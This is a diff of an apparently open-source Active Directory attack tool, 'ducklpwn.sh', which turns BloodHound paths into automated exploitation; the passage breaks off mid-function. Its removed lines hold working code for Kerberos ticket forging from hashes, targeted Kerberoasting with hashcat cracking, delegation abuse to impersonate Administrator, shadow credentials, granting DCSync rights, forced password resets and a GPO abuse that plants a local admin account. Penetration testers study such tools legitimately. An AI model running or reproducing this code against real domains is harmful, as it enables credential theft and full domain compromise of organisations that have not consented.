@@ -1,4 +1,6 @@
 #!/bin/bash
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+. "$SCRIPT_DIR/exploits.sh"
 
 # Define colors (non-bold versions)
 WHITE='\033[0;37m'      # Abuse type
@@ -33,10 +35,10 @@ EOF
 usage(){
   echo -e "\n${BOLD}USAGE${NC}"
   echo -e "  ${YELLOW}./ducklpwn.sh [options]${NC}"
-  echo ""
+  echo -e ""
   echo -e "${BOLD}DESCRIPTION${NC}"
   echo -e "  Generates Bloodhound chains and exploits them automatically."
-  echo ""
+  echo -e ""
 
   echo -e "${BOLD}FLAGS${NC}"
   echo -e "  ${GREEN}-dc <DC_FQDN>${NC}        Domain Controller fully-qualified domain name (target scope for analysis)"
@@ -52,7 +54,7 @@ usage(){
   echo -e "                           ${GRAY}(Specify UPN for users and FQDN for PCs)${NC}"
   echo -e "  ${GREEN}--owned${NC}              Build attack chains for users previously marked as owned in BloodHound"
   echo -e "  ${GREEN}-h, --help${NC}           Show this help text and exit"
-  echo ""
+  echo -e ""
 
   echo -e "${BOLD}EXAMPLES${NC}"
   echo -e "  ${GRAY}# Collect and ingest BloodHound data then run analysis for all users${NC}"
@@ -322,8 +324,6 @@ make_chains() {
             }
         }
         
-        # Debug: print statistics
-        # print "DEBUG: Processed " qend " paths"
     }
     ' "$input_file"
 }
@@ -454,94 +454,28 @@ color_to_obj() {
     
     # Check for color codes and return corresponding type
     if [[ "$input" == *$'\033[0;32m'* ]]; then
-        echo "User"
+        echo -e "User"
     elif [[ "$input" == *$'\033[0;35m'* ]]; then
-        echo "Computer"
+        echo -e "Computer"
     elif [[ "$input" == *$'\033[0;33m'* ]]; then
-        echo "Group"
+        echo -e "Group"
     elif [[ "$input" == *$'\033[0;34m'* ]]; then
-        echo "OU"
+        echo -e "OU"
     elif [[ "$input" == *$'\033[0;36m'* ]]; then
-        echo "Domain"
+        echo -e "Domain"
     elif [[ "$input" == *$'\033[0;91m'* ]]; then
-        echo "GPO"
+        echo -e "GPO"
     elif [[ "$input" == *$'\033[0;37m'* ]]; then
-        echo "ACL"
+        echo -e "ACL"
     else
-        echo "Unknown"
-        echo "Error in detecting type for $input" >/dev/tty
+        echo -e "Unknown"
+        echo -e "${RED}Error in detecting type for $input ${NC}" >/dev/tty
     fi
 }
 
 # Dumps and Ingest the Domain ZIP File
 domain=${DC_FQDN#*.}
 flt_domain=${domain^^}
-
-get_ticket() {
-    local DC_FQDN=""
-    local USERNAME=""
-    local PASSWORD=""
-    local HASH=""
-
-    # Parse command-line arguments
-    while [[ $# -gt 0 ]]; do
-        case "$1" in
-            -u|--username)
-                USERNAME="$2"
-                USERNAME="${USERNAME^^}"
-                shift 2
-                ;;
-            -p|--password)
-                PASSWORD="$2"
-                shift 2
-                ;;
-            -H|--hash)
-                HASH="$2"
-                shift 2
-                ;;
-            *)
-                DC_FQDN="$1"
-                shift
-                ;;
-        esac
-    done
-
-    if [[ -z "$DC_FQDN" || -z "$USERNAME" ]]; then
-        echo -e "Usage: get_ticket DC_FQDN -u USERNAME [-p PASSWORD | -H HASH]"
-        return 1
-    fi
-
-    if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
-        echo -e "${RED}[-] ERROR: Cannot specify both password and hash${NC}"
-        return 1
-    fi
-
-    if [[ -z "$PASSWORD" && -z "$HASH" ]]; then
-        echo -e "${RED}[-] ERROR: Must specify either password or hash${NC}"
-        return 1
-    fi
-
-    echo -e "\n[*] Generating TGT for \"$USERNAME\""
-    
-    if [[ -n "$HASH" ]]; then
-        output=$(nxc smb "$DC_IP" -u "$USERNAME" -H "$HASH" -k --generate-tgt "./$USERNAME" 2>&1)
-        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
-            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
-            echo "$output" > /dev/tty
-            return 1
-        fi
-    elif [[ -n "$PASSWORD" ]]; then
-        output=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -k --generate-tgt "./$USERNAME" 2>&1)
-        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
-            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
-            echo "$output" > /dev/tty
-            return 1
-        fi
-    fi
-
-    export KRB5CCNAME="./${USERNAME}.ccache"
-    echo -e "${BLUE}[+] Ticket ${USERNAME}.ccache created and saved in current dir. ${NC}" >/dev/tty
-}
 
 if [[ ! -z $PASSWORD ]]; then
     get_ticket $DC_FQDN -u $USERNAME -p $PASSWORD
@@ -689,7 +623,7 @@ else
 fi
 echo -e "\n${GRAY}[*] Query executed, parsing it..."
 
-DACL=$(echo "$DACL_JSON" | jq -r '
+DACL=$(echo -e "$DACL_JSON" | jq -r '
   .data as $data |
   $data.edges[] |
   {
@@ -712,33 +646,27 @@ DACL=$(echo "$DACL_JSON" | jq -r '
 done)
 
 if [[ ! -z $DACL ]]; then
-    echo -e "\n[*] Building attack chains..."
+    echo -e "[*] Building attack chains..."
     start_time=$(date +%s)
     
     # Parse and prepare DACL data - handle domain suffixes properly
-    echo "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}//g" | sed 's/[[:space:]]*$//' | sort -u > ./DACL_${flt_domain}
+    echo -e "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}//g" | sed 's/[[:space:]]*$//' | sort -u > ./DACL_${flt_domain}
     
     echo -e "[*] Processed $(wc -l < "./DACL_${flt_domain}") unique relationships"
     
     # Only align if we have relationships
     if [[ -s "./DACL_${flt_domain}" ]]; then
         align_ad_relationships "./DACL_${flt_domain}" > ./DACL_ALIGN_${flt_domain} && mv ./DACL_ALIGN_${flt_domain} ./DACL_${flt_domain}
-        echo -e "[*] After alignment: $(wc -l < "./DACL_${flt_domain}") relationships"
     else
         echo -e "[-] No relationships found after parsing DACL data"
         exit 1
     fi
-        # Use optimized chain building
-    echo -e "[*] Processing $(wc -l < "./DACL_${flt_domain}") relationships..."
-    
+
     make_chains "./DACL_${flt_domain}" > "DACL_ABUSE_${flt_domain}.txt"
     
     end_time=$(date +%s)
     echo -e "[+] Chain building completed in $((end_time - start_time)) seconds${NC}"
     
-    end_time=$(date +%s)
-    echo -e "[+] Chain building completed in $((end_time - start_time)) seconds${NC}"
-
     # FIXED FILTERING LOGIC - PROPERLY SEPARATE PURE MEMBERSHIP CHAINS
 
     # Account operators domain paths - JUST FOR DISPLAY, DON'T REMOVE
@@ -789,7 +717,7 @@ fi
 grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' DACL_ABUSE_${flt_domain}.txt --color=never > ./OU_TARGETS_${flt_domain}.txt
 if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
     OU_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Contains*1..]->(t)) \\nWHERE s:OU and (t:User or t:Group or t:Computer) \\nAND s<>t AND s.domain = \\\"${flt_domain}\\\"\\nRETURN p\"}")
-    OU=$(echo "$OU_JSON" | jq -r '
+    OU=$(echo -e "$OU_JSON" | jq -r '
     .data as $data |
     $data.edges[] |
     {
@@ -845,7 +773,7 @@ input_file="DACL_ABUSE_${flt_domain}.txt"
 
 # Verify file exists and is readable
 if [ ! -f "$input_file" ] || [ ! -r "$input_file" ]; then
-    echo "[-] ERROR: Cannot read file '$input_file'"
+    echo -e "[-] ERROR: Cannot read file '$input_file'"
     exit 1
 fi
 
@@ -854,7 +782,7 @@ readarray -t chains < <(grep -v -e '^$' -e '^#' "$input_file")
 
 # Check if we got any chains
 if [ ${#chains[@]} -eq 0 ]; then
-    echo "[-] ERROR: No valid chains found in file"
+    echo -e "[-] ERROR: No valid chains found in file"
     exit 1
 fi
 
@@ -863,7 +791,7 @@ get_unique_sources() {
     declare -A sources
     for chain in "${chains[@]}"; do
         # Extract first node (handles chains starting with special characters)
-        source_node=$(echo "$chain" | awk '{print $1}')
+        source_node=$(echo -e "$chain" | awk '{print $1}')
         sources["$source_node"]=1
     done
     printf '%s\n' "${!sources[@]}" | sort
@@ -883,14 +811,14 @@ fi
 # Display pure membership chains first (information only)
 if [[ -s GRPS_${flt_domain}.txt ]]; then
     echo -e "\n${BOLD}${YELLOW}PURE MEMBERSHIP CHAINS (Information Only)${NC}"
-    echo "=========================================================="
+    echo -e "=========================================================="
     cat GRPS_${flt_domain}.txt
 fi
 
 # Display DACL abuse chains with numbers and colors
 if [[ -s DACL_ABUSE_${flt_domain}.txt ]]; then
     echo -e "\n${BOLD}${YELLOW}DACL ABUSE CHAINS (Select to Exploit)${NC}"
-    echo "=========================================================="
+    echo -e "=========================================================="
     for i in "${!all_chains[@]}"; do
         printf "%2d) %s\n" $((i+1)) "${all_chains[i]}"
     done
@@ -910,8 +838,8 @@ while true; do
             echo -e "$selected_chain\n"
             
             # Extract the starting node for authentication
-            start_node=$(echo "$selected_chain" | awk -F' ---' '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
-            start_node_type=$(color_to_obj "$(echo "$selected_chain" | awk -F' ---' '{print $1}')")
+            start_node=$(echo -e "$selected_chain" | awk -F' ---' '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
+            start_node_type=$(color_to_obj "$(echo -e "$selected_chain" | awk -F' ---' '{print $1}')")
             
             echo -e "[*] Starting node: $start_node ($start_node_type)"
             
@@ -948,15 +876,15 @@ while true; do
                 # For non-group starting nodes, use the node itself
                 AUTH_USER="$start_node"
                 while true; do
-                    echo "${YELLOW}[?] Choose authentication method for $AUTH_USER:${NC}"
-                    echo "  1) Password"
-                    echo "  2) NT hash"
-                    echo "  3) Kerberos ticket file"
+                    echo -e "${YELLOW}[?] Choose authentication method for $AUTH_USER:${NC}"
+                    echo -e "  1) Password"
+                    echo -e "  2) NT hash"
+                    echo -e "  3) Kerberos ticket file"
                     read -erp "Select option (1-3): " auth_method </dev/tty
                     
                     case $auth_method in
                         1)
-                            read -erp "${YELLOW}[?] Enter password for $AUTH_USER: ${NC}" password </dev/tty
+                            read -erp "[?] Enter password for $AUTH_USER: " password </dev/tty
                             echo
                             get_ticket "$DC_FQDN" -u "$AUTH_USER" -p "$password"
                             if [ $? -eq 0 ]; then break; fi
@@ -964,32 +892,32 @@ while true; do
                             
                         2)
                             while true; do
-                                read -erp "${YELLOW}[?] Enter NT hash for $AUTH_USER (32 chars): ${NC}" nt_hash </dev/tty
+                                read -erp "[?] Enter NT hash for $AUTH_USER (32 chars): " nt_hash </dev/tty
                                 if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
                                     get_ticket "$DC_FQDN" -u "$AUTH_USER" -H "$nt_hash"
                                     if [ $? -eq 0 ]; then break 2; fi
                                     break
                                 else
-                                    echo "[-] Invalid hash format. Must be 32-character hex string."
+                                    echo -e "[-] Invalid hash format. Must be 32-character hex string."
                                 fi
                             done
                             ;;
                             
                         3)
                             while true; do
-                                read -erp "${YELLOW}[?] Enter path to Kerberos ticket file: ${NC}" ticket_file </dev/tty
+                                read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
                                 if [[ ! -f "$ticket_file" ]]; then
-                                    echo "[-] File does not exist: $ticket_file"
+                                    echo -e "[-] File does not exist: $ticket_file"
                                     break
                                 fi
                                 
                                 if [[ ! -s "$ticket_file" ]]; then
-                                    echo "[-] Ticket file is empty: $ticket_file"
+                                    echo -e "[-] Ticket file is empty: $ticket_file"
                                     break
                                 fi
                                 
                                 # Clean the source name for filename
-                                auth_user_clean=$(echo "$AUTH_USER" | sed -e 's/\x1b\[[0-9;]*m//g')
+                                auth_user_clean=$(echo -e "$AUTH_USER" | sed -e 's/\x1b\[[0-9;]*m//g')
                                 cp "$ticket_file" "./${auth_user_clean}.ccache"
                                 cp "$ticket_file" "./${auth_user_clean,,}.ccache"
                                 
@@ -997,14 +925,14 @@ while true; do
                                 if klist; then
                                     break 2
                                 else
-                                    echo "[-] The provided ticket file is invalid or expired"
+                                    echo -e "[-] The provided ticket file is invalid or expired"
                                     break
                                 fi
                             done
                             ;;
                             
                         *)
-                            echo "[-] Invalid selection. Please choose 1, 2, or 3."
+                            echo -e "[-] Invalid selection. Please choose 1, 2, or 3."
                             ;;
                     esac
                     
@@ -1016,903 +944,15 @@ while true; do
             break
             
         elif (( choice == 0 )); then
-            echo "Exiting..."
+            echo -e "Exiting..."
             exit 0
         else
             echo -e "[-] Invalid option. Please try again.\n"
         fi
     else
-        echo "Please enter a valid number."
+        echo -e "Please enter a valid number."
     fi
 done
-
-# Now proceed with exploitation using the authenticated user
-echo -e "\nProceeding with exploitation of selected chain..."
-for chain in "${selected_chains[@]}"; do
-    # Clean the chain of color codes for processing
-    clean_chain=$(echo "$chain" | sed 's/\x1B\[[0-9;]*[mGK]//g')
-    
-    # Parse the clean chain into individual steps
-    echo "$clean_chain" | \
-    awk -F' ---|--> ' '
-    {
-        # Parse each relationship in the chain
-        for (i=1; i<=NF; i+=3) {
-            if (i+2 <= NF) {
-                source = $i
-                abuse = $(i+1) 
-                target = $(i+2)
-                # Clean up any remaining whitespace
-                gsub(/^[[:space:]]+|[[:space:]]+$/, "", source)
-                gsub(/^[[:space:]]+|[[:space:]]+$/, "", abuse)
-                gsub(/^[[:space:]]+|[[:space:]]+$/, "", target)
-                
-                if (source != "" && abuse != "" && target != "") {
-                    printf "%s|%s|%s\n", abuse, source, target
-                }
-            }
-        }
-    }' | \
-    
-    while IFS="|" read -r abuse source target; do
-        # Clean up any extra whitespace
-        abuse=$(echo "$abuse" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
-        source=$(echo "$source" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
-        target=$(echo "$target" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
-        
-        # Simple object type detection based on naming conventions
-        if [[ "$source" == *\$ ]]; then
-            source_obj_type="Computer"
-        elif [[ "$source" =~ ^[A-Z][A-Z0-9 ]*[A-Z0-9]$ && "$source" != *"@"* ]]; then
-            source_obj_type="Group" 
-        elif [[ "$source" == *"@"* ]]; then
-            source_obj_type="User"
-        elif [[ "$source" == *"."* && "$source" != *"@"* ]]; then
-            source_obj_type="Domain"
-        else
-            source_obj_type="User"
-        fi
-        
-        if [[ "$target" == *\$ ]]; then
-            target_obj_type="Computer"
-        elif [[ "$target" =~ ^[A-Z][A-Z0-9 ]*[A-Z0-9]$ && "$target" != *"@"* ]]; then
-            target_obj_type="Group"
-        elif [[ "$target" == *"@"* ]]; then
-            target_obj_type="User"
-        elif [[ "$target" == *"."* && "$target" != *"@"* ]]; then
-            target_obj_type="Domain"
-        else
-            target_obj_type="User"
-        fi
-
-        echo -e "\n${YELLOW}[*] Processing: $source ($source_obj_type) ---$abuse--> $target ($target_obj_type)${NC}"
-
-        # Skip MemberOf relationships (they're just for pathing)
-        if [[ "$abuse" == "MemberOf" ]]; then
-            echo -e "${GREEN}[+] MemberOf relationship - continuing chain${NC}"
-            continue
-        fi
-
-        # Use the authenticated user for exploitation
-        SRC="$AUTH_USER"
-
-        # Execute the exploitation command
-        case "$abuse" in
-            "GenericAll")
-                GenericAll "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "GenericWrite")
-                GenericWrite "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "WriteOwner")
-                WriteOwner "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "WriteDacl")
-                WriteDACL "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "ForceChangePassword")
-                ForceChangePassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "AllExtendedRights")
-                AllExtendedRights "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "AddMember")
-                AddMember "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "AddSelf")
-                AddSelf "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "DCSync")
-                DCSync "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "WriteSPN")
-                WriteSPN "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "AddKeyCredentialLink")
-                AddKeyCredentialLink "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "ReadLAPSPassword")
-                ReadLAPSPassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "ReadGMSAPassword")
-                ReadGMSAPassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "WriteGPLink")
-                WriteGPLink "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            "AllowedToDelegate")
-                AllowedToDelegate "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                exit_status=$?
-                ;;
-            *)
-                echo -e "${RED}[!] Unknown or unsupported abuse type: $abuse${NC}" >/dev/tty
-                exit_status=1
-                ;;
-        esac
-
-        # Check if the command failed (non-zero exit status)
-        if [ $exit_status -ne 0 ]; then
-            echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty
-
-            # Prompt user for action
-            while true; do
-                read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
-                case "$choice" in
-                    [Ss]* ) 
-                        echo -e "[~] Skipping to next command..." >/dev/tty
-                        break
-                        ;;
-                    [Rr]* ) 
-                        echo -e "[~] Retrying..." >/dev/tty
-                        # Retry the same command
-                        case "$abuse" in
-                            "GenericAll")
-                                GenericAll "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                                exit_status=$?
-                                ;;
-                            "GenericWrite")
-                                GenericWrite "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                                exit_status=$?
-                                ;;
-                            "WriteOwner")
-                                WriteOwner "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                                exit_status=$?
-                                ;;
-                            "WriteDacl")
-                                WriteDACL "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                                exit_status=$?
-                                ;;
-                            "ForceChangePassword")
-                                ForceChangePassword "$DC_FQDN" "$SRC" "$target" "$target_obj_type"
-                                exit_status=$?
-                                ;;
-                            *)
-                                echo -e "${RED}[!] Cannot retry abuse type: $abuse${NC}" >/dev/tty
-                                exit_status=1
-                                ;;
-                        esac
-                        if [ $exit_status -eq 0 ]; then
-                            break
-                        fi
-                        ;;
-                    * ) 
-                        echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
-                        ;;
-                esac
-            done
-        fi
-    done
-done
-
-
-hashcat_crack() {
-    local hash_file="$1"  # This should be a FILE containing the hash, not the hash itself
-    local mode="$2"
-
-    while true; do
-        read -e -p "[?] Path to wordlist (or 'exit' to quit): " WORDLIST </dev/tty
-        [[ "$WORDLIST" == "exit" ]] && { echo "[!] Exiting."; return 0; }
-        
-        [[ ! -f "$WORDLIST" ]] && { echo "[-] Wordlist not found!"; continue; }
-
-        echo "[*] Cracking with hashcat..."
-        hashcat -m "$mode" -a 0 -w 3 -O -o cracked.txt "$hash_file" "$WORDLIST" </dev/tty
-
-        if [[ -s "cracked.txt" ]]; then
-            CRACKED_PASS=$(awk -F':' '{print $NF}' cracked.txt)
-            echo "[+] Success! Password: $CRACKED_PASS"
-            export CRACKED_PASS
-            rm -f cracked.txt
-            return 0
-        else
-            echo "[-] No password found."
-        fi
-    done
-}
-
-
-MemberOf(){
-    return 0
-} 
-
-
-WriteSPN(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteSPN--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo "$TARGET" > ./users_file.txt
-    local OUTPUT=$($targetedkerberoast -d "$DOMAIN" -U ./users_file.txt -u "$SRC" -k --no-pass --dc-host "$DC_FQDN" -f hashcat 2>&1)
-    
-    # Extract the hash
-    local KERB_HASH=$(echo "$OUTPUT" | grep -oP '\$krb5tgs\$[^\s]*')
-    if [ -z "$KERB_HASH" ]; then
-        echo "[-] Failed to get Kerberoast hash with output \n $OUTPUT" >/dev/tty
-        return 1
-    fi
-    
-    echo "[+] Obtained Kerberos hash:" >/dev/tty
-    echo "$KERB_HASH" >/dev/tty
-    echo "$KERB_HASH" > "$TARGET".hash
-
-    hashcat_crack "$TARGET.hash" 13100
-    get_ticket "$DC_FQDN" -u "$TARGET" -p "$CRACKED_PASS"
-}
-
-AllowedToDelegate(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllowedToDelegate--> $3\" \n${NC}" >/dev/tty
-    
-    export KRB5CCNAME="./$SRC.ccache"
-    if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$SRC"; then
-        echo "[-] getST failed" > /dev/tty
-        return 1
-    fi
-    mv ./*cifs*"$TARGET"*"$DOMAIN".ccache ./"$TARGET".ccache
-}
-
-AddKeyCredentialwLink(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddKeyCredentialLink--> $3\" \n${NC}" >/dev/tty
-    
-    export KRB5CCNAME="./$SRC.ccache"
-
-    local output
-    output=$(certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP" -ldap-scheme ldap -ns $DC_IP -dns-tcp -target "$DC_FQDN" 2>&1 | tee /dev/tty)
-
-    # Failed to get both ticket and hash
-    if [[ "$output" == *"[-] Got error while trying to request TGT"* ]] && [[ "$output" == *"NT hash for"*"None"* ]]; then
-        return 1
-    fi
-
-    # Ticket created
-    if [[ "$output" == *"Got TGT"* ]]; then
-        mv "${TARGET,,}.ccache" "$TARGET.ccache"
-        # Hash retrieved
-        if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
-            hash="${BASH_REMATCH[1]}"
-            echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
-        fi
-        echo -e "${BLUE}[+] Ticket ${TARGET}.ccache created and saved in current dir. ${NC}" >/dev/tty
-        return 0
-    fi
-    
-    # Hash retrieved but no ticket
-    if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
-        hash="${BASH_REMATCH[1]}"
-        echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
-        get_ticket "$DC_FQDN" -u "$TARGET" -H "$hash"
-        return $?
-    fi
-
-    return 1
-}
-
-AddSelf() {
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddSelf--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-    
-    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add groupMember "$TARGET" "$SRC"; then
-        return 1
-    else
-        return 0
-    fi
-}
-
-ForceChangePassword() {
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ForceChangePassword--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-    
-    echo -e "${BLUE}\n[+] Setting as new password for \"$TARGET\": P@ssword123!P@ssword123! \n${NC}"
-
-    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set password "$TARGET" 'P@ssword123!P@ssword123!'; then
-        echo "[-] ERROR: Failed to change password for $TARGET" >&2
-        return 1
-    fi
-    
-    if ! get_ticket "$DC_FQDN" -u "$TARGET" -p 'P@ssword123!P@ssword123!'; then
-        return 1
-    fi
-
-    return 0
-}
-
-WriteOwner() {
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteOwner--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-
-    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set owner "$TARGET" "$SRC"; then
-        echo "[-] Failed to give WriteDACL for $TARGET"
-        return 1
-    fi
-    if ! WriteDACL "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
-        echo "[-] Failed to WriteOwner for $TARGET"
-        return 1
-    fi
-    return 0
-}
-
-WriteDACL(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteDACL--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-
-    if [[ "$TARGET_TYPE" == "Domain" ]]; then
-        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add dcsync "$SRC"
-        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-    else
-        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add genericAll "$TARGET" "$SRC"
-        GenericAll "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-    fi
-    return 0
-}
-Owns(){
-    echo "Skipping Owns Node" >/dev/tty
-    return 0
-}
-
-WriteGPLink(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteGPLink--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo -e "\nPlease execute this command on Windows (powershell):\n\n\"New-GPO -Name MyGPO -Comment \"MyGPO\" | New-GPLink -Target \"OU=$TARGET,DC=$(echo $domain | sed 's/\./,DC=/g')\" -LinkEnabled Yes\"" >/dev/tty
-    while true; do
-        read -rp "Input the GPO ID (or 'exit' to quit): " GPO_ID </dev/tty
-        if [[ "$GPO_ID" == "exit" ]]; then
-            return 1
-        fi
-        if [[ -z "$GPO_ID" ]]; then
-            echo "[-] Invalid GPO ID, try again: " >/dev/tty
-            continue
-        fi
-        break
-    done
-
-    # ONLY VALID FOR COMPUTER CHILDS
-    if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F'.' '{print $1}')" -gpo-id "$GPO_ID" -f -vv | grep -i 'created!' >/dev/tty; then
-        echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
-        return 1
-    else
-        echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
-        echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
-        return 0
-    fi
-}
-
-GenericAll() {
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericAll--> $3\" \n${NC}" >/dev/tty
-    export KRB5CCNAME="./$SRC.ccache"
-
-    if [[ "$TARGET_TYPE" == "User" ]]; then
-        AddKeyCredentialLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-        result1=$?
-        WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-        result2=$?
-        if [[ $result1 -ne 0 ]] && [[ $result2 -ne 0 ]]; then
-            ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-            result3=$?
-            if [[ $result3 -ne 0 ]]; then
-                return 1
-            fi
-        fi
-        return 0
-    fi
-
-    if [[ "$TARGET_TYPE" == "Group" ]]; then
-        if ! AddMember "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
-            return 1
-        fi
-    fi
-
-    if [[ "$TARGET_TYPE" == "Domain" ]]; then
-        if ! DCSync "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
-            return 1
-        fi
-    fi
-
-    if [[ "$TARGET_TYPE" == "GPO" ]]; then
-#----------------------------------------LDAP AUTH----------------------------------------------
-        echo -e "\n[*] LDAP Authentication" >/dev/tty
-        # Try to authenticate with prev. ticket
-        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
-        if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-            echo "Authentication successful!" >/dev/tty
-        else
-            # Manual ldap auth
